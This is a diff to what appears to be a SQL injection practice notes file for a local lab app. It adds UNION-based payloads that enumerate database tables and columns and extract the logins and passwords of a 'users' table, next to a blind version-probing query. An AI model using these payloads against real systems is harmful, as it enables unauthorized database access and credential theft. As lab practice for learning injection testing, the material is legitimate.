@@ -14,6 +14,6 @@ http://localhost:8081/cases/3/?id=1 AND SUBSTR(@@version, 1, 1) = 5
 
 
 4)
-// http://localhost:8081/cases/4/?month=-1 union select table_schema, table_name, null, null, null from information_schema.tables;--
-// http://localhost:8081/cases/4/?month=-1 union select column_name, null, null, null, null from information_schema.tables where table_name = 'users';--
-' UNION SELECT login, password, null from users WHERE '1' = '1
+' UNION SELECT table_schema, table_name, null FROM information_schema.tables WHERE '1' = '1
+' UNION SELECT column_name, null, null FROM information_schema.columns WHERE table_name = 'users
+' UNION SELECT login, password, null FROM users WHERE '1' = '1
